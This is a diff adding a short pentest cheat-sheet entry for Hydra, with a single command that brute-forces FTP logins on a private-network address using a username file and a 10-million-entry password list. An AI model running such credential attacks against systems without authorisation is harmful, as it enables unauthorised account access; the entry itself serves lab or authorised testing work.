@@ -1,0 +1,4 @@
+% hydra
+
+# FTP: ignore hydra.restore; very verbose; stop on found; (-u) rotate usernames not passwords
+hydra -I -V -f -L usernames.txt -u -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt 192.168.179.46 ftp
